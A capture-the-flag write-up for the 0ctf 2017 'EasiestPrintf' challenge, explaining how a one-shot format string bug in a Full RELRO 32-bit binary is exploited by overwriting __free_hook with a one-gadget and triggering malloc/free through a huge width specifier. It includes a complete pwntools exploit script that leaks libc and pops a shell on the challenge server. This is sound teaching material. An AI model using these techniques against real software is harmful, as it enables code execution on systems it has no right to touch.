# 0ctf quals 2017 : EasiestPrintf

## **[Principle]**
format string

## **[Purpose]**
Master the general process of PWN topics

## **[Environment]**
Ubuntu

## **[Tools]**
gdb、objdump、python、pwntools

## **[Process]**

This is a simple binary. After some setup, it first gives us an arbitrary read and then a 159-byte format string vulnerability. The problem is that this is a Full RELRO binary, so we can not change the GOT value to hijack the control flow. Moreover, because the printf is immediately followed by an _exit, we have to exploit in a single format string.

Several ideas come to my mind.

Because it is a 32-bit binary, maybe we can brute force the return address of printf.
Exploit the exit function, maybe something like atexit function pointer is exploitable.
Change the value of __malloc_hook or __free_hook and find a way to trigger them in printf.
For the first idea, the search space is large, and both the manual randomization of stack through alloca and sleep(3) at the beginning of the binary discourage this solution.

For the second idea, atexit function pointers are encrypted, and this binary use _exit instead of exit, which won’t trigger atexit functions anyway.

Finally, the third idea works out. By searching malloc in vfprintf.c, it seems that we can trigger malloc and the following free if the width field of the format placeholder is large enough.

vfprintf.c

	if (width >= WORK_BUFFER_SIZE - 32)
	  {
	    size_t needed = ((size_t) width + 32) * sizeof (CHAR_T);
	    ...
	    workstart = (CHAR_T *) malloc (needed);
Although it took me quite a while to come up with the solution, the final exploitation is short and straightforward.

Leak the libc address from the arbitrary read.
Construct a format string with
the %hhn trick to modify __free_hook to the one-gadget.
%100000c to trigger malloc and free.
I choose __free_hook instead of __malloc_hook because the address of __malloc_hook contains a \x0a byte which will break the reading of the input.

The full script is as follows.

EasiestPrintf_exp.py

	from pwn import *

	context.terminal = ['tmux', 'splitw', '-h']
	context.log_level = 'critical'

	libc = ELF('./libc.so.6_0ed9bad239c74870ed2db31c735132ce')
	binary = ELF('./EasiestPrintf')
	read_got = binary.symbols['_GLOBAL_OFFSET_TABLE_'] + 12
	libc.symbols['one_gadget'] = 0x3E297

	def exec_fmt(payload):
	    p = binary.process(env={ 'LD_PRELOAD': libc.path })
	    p.sendline(str(read_got))
	    p.recvuntil('Good Bye\n')
	    p.sendline(payload)
	    return p.recvall()

	fmt = FmtStr(exec_fmt)
	log.critical('offset: ' + str(fmt.offset))


	# r = binary.process(env={ 'LD_PRELOAD': libc.path })
	# gdb.attach(r, '''
	# c
	# ''')
	r = remote('202.120.7.210', 12321)

	print r.recvline()

	# Leak the libc base address.
	r.sendline(str(read_got))
	data = r.recvline()
	print data
	read_addr = int(data, 16)
	libc.address = read_addr - libc.symbols['read']
	log.critical('libc_base: ' + hex(libc.address))
	log.critical('__free_hook: ' + hex(libc.symbols['__free_hook']))
	log.critical('one gadget: ' + hex(libc.symbols['one_gadget']))

	# Use format string to override the value of __free_hook to one gadget and
	# trigger free by a long width format string.
	print r.recvline()
	r.sendline(fmtstr_payload(fmt.offset, { libc.symbols['__free_hook']: libc.symbols['one_gadget'] }) + '%100000c')
	r.interactive()



## **[Summary]**
What I’ve learned:
Both printf and scanf can trigger malloc and free.
